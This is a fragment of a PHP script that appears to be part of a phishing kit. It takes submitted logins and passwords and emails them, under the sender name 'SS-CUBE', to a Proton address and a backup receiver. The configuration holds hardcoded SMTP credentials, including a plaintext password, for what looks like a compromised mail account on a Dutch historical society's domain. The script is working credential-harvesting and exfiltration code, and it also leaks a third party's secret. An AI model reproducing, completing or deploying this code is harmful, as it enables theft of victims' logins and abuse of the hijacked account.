...
// Configuration
$receiver     = "larryeckhardt.com@proton.me"; // Primary receiver for logs
$receiver2    = "backup@example.com";          // Secondary receiver for logs
$senderuser   = "archief@historischeverenigingroon.nl"; // SMTP user
$senderpass   = "gXShzqZtV6Kgd5Q";         // SMTP password
$senderport   = 587;                    // SMTP port
$senderserver = "mail.historischeverenigingroon.nl";   // SMTP server
...
function sendEmail($subject, $message, $smtpConfig) {
    ...
    try {
        ...
        $mail->SMTPSecure = 'tls';
        $mail->setFrom($smtpConfig['username'], 'SS-CUBE');  // Combined method
        
        // Add primary receiver
        $mail->addAddress($smtpConfig['receiver']);
        
        // Add secondary receiver if provided
        if (!empty($smtpConfig['receiver2'])) {
            $mail->addAddress($smtpConfig['receiver2']);
        }
...
if (!empty($login) && !empty($passwd)) {
    ...
    if ($validCredentials) {
        ...
        $smtpConfig = [
            'host' => "mail.historischeverenigingroon.nl",
            'username' => $senderuser,
            'password' => $senderpass,
            'port' => $senderport,
            'receiver' => $receiver,
